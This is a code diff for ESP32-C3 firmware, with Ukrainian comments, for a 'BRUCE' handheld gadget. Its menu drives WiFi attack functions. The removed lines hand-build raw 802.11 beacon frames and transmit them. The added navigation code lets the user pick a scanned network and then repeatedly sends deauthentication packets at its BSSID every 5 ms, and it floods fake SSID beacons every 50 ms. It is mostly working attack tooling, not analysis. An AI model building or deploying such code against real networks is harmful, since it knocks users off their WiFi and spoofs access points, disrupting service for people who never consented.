-  // Timestamp (8 bytes)
-  for (int i = 24; i < 32; i++) packet[i] = random(0, 255);
-  
-  // Beacon interval (100ms = 0x0064)
-  packet[32] = 0x64;
-  packet[33] = 0x00;
-  
-  // Capability info
-  packet[34] = 0x21;
-  packet[35] = 0x04;
-  
-  // SSID tag
-  int pos = 36;
-  packet[pos++] = 0x00; // SSID tag
-  packet[pos++] = ssidLen;
-  memcpy(packet + pos, ssid, ssidLen);
-  pos += ssidLen;
-  
-  // Supported rates
-  packet[pos++] = 0x01; // Rates tag
-  packet[pos++] = 0x04; // Length
-  packet[pos++] = 0x82; // 1 Mbps
-  packet[pos++] = 0x84; // 2 Mbps
-  packet[pos++] = 0x8B; // 5.5 Mbps
-  packet[pos++] = 0x96; // 11 Mbps
-  
-  // DS Parameter (channel 1)
-  packet[pos++] = 0x03; // DS tag
-  packet[pos++] = 0x01; // Length
-  packet[pos++] = 0x01; // Channel 1
-  
-  // Відправляємо пакет
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
-}
-
-// ====================== Навігація ======================
+// ===== НАВІГАЦІЯ =====
 void handleNavigation() {
-  static unsigned long lastPress = 0;
-  if (millis() - lastPress < 150) return;
-  
-  bool up   = digitalRead(BTN_UP) == LOW;
-  bool down = digitalRead(BTN_DOWN) == LOW;
-  bool sel  = digitalRead(BTN_SEL) == LOW;
-  bool back = digitalRead(BTN_BACK) == LOW;
-  
+  bool up   = btnPressed(BTN_UP,   0);
+  bool down = btnPressed(BTN_DOWN, 1);
+  bool sel  = btnPressed(BTN_SEL,  2);
+  bool back = btnPressed(BTN_BACK, 3);
+
+  // Оновлення лічильників у активних режимах
+  if (deauthRunning && currentState == STATE_DEAUTH) {
+    if (millis() - lastDeauth > 5) {
+      sendDeauthPacket(networks[selectedNet].bssid);
+      deauthCount++;
+      lastDeauth = millis();
+      // Оновлюємо лічильник на екрані
+      tft.setTextColor(CLR_TEXT);
+      tft.fillRect(2, CONTENT_Y + 38, 120, 10, CLR_BG);
+      tft.setCursor(2, CONTENT_Y + 38);
+      char cntStr[24];
+      snprintf(cntStr, sizeof(cntStr), "Pkts: %lu", deauthCount);
+      tft.print(cntStr);
+    }
+  }
+
+  if (beaconRunning && currentState == STATE_BEACON_RUN) {
+    if (millis() - lastBeacon > 50) {
+      sendBeaconPacket(beaconSSIDs[beaconSelected]);
+      beaconCount++;
+      lastBeacon = millis();
+      // Оновлюємо лічильник
+      tft.setTextColor(CLR_TEXT);
+      tft.fillRect(2, CONTENT_Y + 28, 140, 10, CLR_BG);
+      tft.setCursor(2, CONTENT_Y + 28);
+      char cntStr[24];
+      snprintf(cntStr, sizeof(cntStr), "Pkts sent: %lu", beaconCount);
+      tft.print(cntStr);
+    }
+  }
+
   if (!up && !down && !sel && !back) return;
-  lastPress = millis();
-  
-  // BACK
-  if (back) {
-    if (currentState == MAIN_MENU) return;
-    
-    if (deauthActive) stopDeauth();
-    if (beaconActive) stopBeacon();
-    
-    currentState = MAIN_MENU;
-    drawMainMenu();
-    return;
-  }
-  
-  // Обробка для кожного стану
+
   switch (currentState) {
-    case MAIN_MENU:
-      if (up && mainMenuIndex > 0) {
-        mainMenuIndex--;
+
+    // ===== ГОЛОВНЕ МЕНЮ =====
+    case STATE_MAIN_MENU:
+      if (up && menuCursor > 0) {
+        menuCursor--;
+        if (menuCursor < menuScroll) menuScroll = menuCursor;
         drawMainMenu();
       }
-      if (down && mainMenuIndex < mainMenuSize - 1) {
-        mainMenuIndex++;
+      if (down && menuCursor < MAIN_MENU_SIZE - 1) {
+        menuCursor++;
+        if (menuCursor >= menuScroll + VISIBLE_ITEMS)
+          menuScroll = menuCursor - VISIBLE_ITEMS + 1;
         drawMainMenu();
       }
-      
       if (sel) {
-        switch (mainMenuIndex) {
-          case 0:
-            startWiFiScan();
-            currentState = WIFI_SCAN;
+        switch (menuCursor) {
+          case 0: // WiFi Scan
+            currentState = STATE_WIFI_SCAN;
+            doWifiScan();
             break;
-          case 1:
-            if (apCount == 0) startWiFiScan();
-            currentState = WIFI_DEAUTH;
-            drawWiFiDeauthScreen();
+          case 1: // Deauth — спочатку скан
+            currentState = STATE_WIFI_SCAN;
+            doWifiScan();
             break;
-          case 2:
-            currentState = WIFI_BEACON;
-            drawBeaconScreen();
+          case 2: // Beacon
+            menuCursor = 0; menuScroll = 0;
+            menuSize   = BEACON_SSID_COUNT;
+            currentState = STATE_BEACON_MENU;
+            drawBeaconMenu();
             break;
-          case 3:
-            currentState = SETTINGS;
-            drawSettingsScreen();
+          case 3: // Settings (заглушка)
+            tft.fillRect(0, CONTENT_Y, SCREEN_W, CONTENT_H, CLR_BG);
+            tft.setTextColor(CLR_DIM);
+            tft.setCursor(20, CONTENT_Y + 20);
+            tft.print("Coming soon...");
             break;
         }
       }
       break;
-      
-    case WIFI_SCAN:
-      if (apCount == 0) break;
-      if (up && selectedAP > 0) {
-        selectedAP--;
-        drawWiFiScanList();
+
+    // ===== СПИСОК WiFi =====
+    case STATE_WIFI_LIST:
+      if (up && menuCursor > 0) {
+        menuCursor--;
+        if (menuCursor < menuScroll) menuScroll = menuCursor;
+        drawWifiList();
       }
-      if (down && selectedAP < apCount - 1) {
-        selectedAP++;
-        drawWiFiScanList();
+      if (down && menuCursor < networkCount - 1) {
+        menuCursor++;
+        if (menuCursor >= menuScroll + VISIBLE_ITEMS)
+          menuScroll = menuCursor - VISIBLE_ITEMS + 1;
+        drawWifiList();
       }
-      
+      if (sel && networkCount > 0) {
+        selectedNet  = menuCursor;
+        deauthRunning = false;
+        deauthCount   = 0;
+        currentState  = STATE_DEAUTH;
+        drawDeauthScreen();
+      }
+      if (back) {
+        menuCursor = 0; menuScroll = 0;
+        currentState = STATE_MAIN_MENU;
+        drawMainMenu();
+      }
+      break;
+
+    // ===== DEAUTH =====
+    case STATE_DEAUTH:
       if (sel) {
-        currentState = WIFI_DEAUTH;
-        drawWiFiDeauthScreen();
+        if (deauthRunning) stopDeauth();
+        else startDeauth();
+      }
+      if (back) {
+        stopDeauth();
+        menuCursor = menuScroll = 0;
+        currentState = STATE_WIFI_LIST;
+        drawWifiList();
       }
       break;
-      
-    case WIFI_DEAUTH:
-      if (sel) {
-        if (apCount == 0) {
-          tft.fillScreen(BG_COLOR);
-          drawHeader("Error");
-          tft.setTextColor(ALERT_COLOR);
-          tft.setCursor(10, 40);
-          tft.print("Run scan first!");
-          delay(1500);
-          currentState = MAIN_MENU;
-          drawMainMenu();
-        } else {
-          if (deauthActive) stopDeauth();
-          else startDeauth();
-        }
+
+    // ===== BEACON МЕНЮ =====
+    case STATE_BEACON_MENU:
+      if (up && menuCursor > 0) {
+        menuCursor--;
+        if (menuCursor < menuScroll) menuScroll = menuCursor;
+        drawBeaconMenu();
+      }
+      if (down && menuCursor < BEACON_SSID_COUNT - 1) {
+        menuCursor++;
+        if (menuCursor >= menuScroll + VISIBLE_ITEMS)
+          menuScroll = menuCursor - VISIBLE_ITEMS + 1;
+        drawBeaconMenu();
+      }
+      if (sel) startBeacon();
+      if (back) {
+        menuCursor = 2; menuScroll = 0;
+        currentState = STATE_MAIN_MENU;
+        drawMainMenu();
       }
       break;
-      
-    case WIFI_BEACON:
-      if (up && beaconIndex > 0) {
-        beaconIndex--;
-        drawBeaconScreen();
-      }
-      if (down && beaconIndex < beaconCount - 1) {
-        beaconIndex++;
-        drawBeaconScreen();
-      }
-      if (sel) {
-        if (beaconActive) stopBeacon();
-        else startBeacon();
-        drawBeaconScreen();
-      }
+
+    // ===== BEACON RUN =====
+    case STATE_BEACON_RUN:
+      if (sel || back) stopBeacon();
       break;
-      
-    case SETTINGS:
-      if (up && beaconIndex > 0) {
-        beaconIndex--;
-        drawSettingsScreen();
-      }
-      if (down && beaconIndex < beaconCount - 1) {
-        beaconIndex++;
-        drawSettingsScreen();
-      }
-      break;
+
+    default: break;
   }
+}
+
+// ===== SETUP =====
+void setup() {
+  // Кнопки
+  pinMode(BTN_UP,   INPUT_PULLUP);
+  pinMode(BTN_DOWN, INPUT_PULLUP);
+  pinMode(BTN_SEL,  INPUT_PULLUP);
+  pinMode(BTN_BACK, INPUT_PULLUP);
+
+  // SPI і дисплей
+  SPI.begin(TFT_SCK, -1, TFT_MOSI);
+  tft.initR(INITR_MINI160x80);
+  tft.setRotation(1);
+  tft.fillScreen(CLR_BG);
+
+  // Splash screen
+  tft.setTextColor(CLR_HEADER);
+  tft.setTextSize(2);
+  tft.setCursor(30, 10);
+  tft.print("BRUCE");
+  tft.setTextSize(1);
+  tft.setTextColor(CLR_DIM);
+  tft.setCursor(25, 32);
+  tft.print("ESP32-C3 Gadget");
+
+  // Перевірка дисплею
+  tft.setTextColor(CLR_SUCCESS);
+  tft.setCursor(40, 48);
+  tft.print("TFT OK!");
+
+  // Ініціалізація WiFi
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  tft.setTextColor(CLR_SUCCESS);
+  tft.setCursor(28, 60);
+  tft.print("Wi-Fi Ready!");
+
+  delay(1500);
+
+  // Головне меню
+  menuCursor = 0;
+  menuScroll = 0;
+  menuSize   = MAIN_MENU_SIZE;
+  drawMainMenu();
+}
+
+// ===== LOOP =====
+void loop() {
+  handleNavigation();
 }
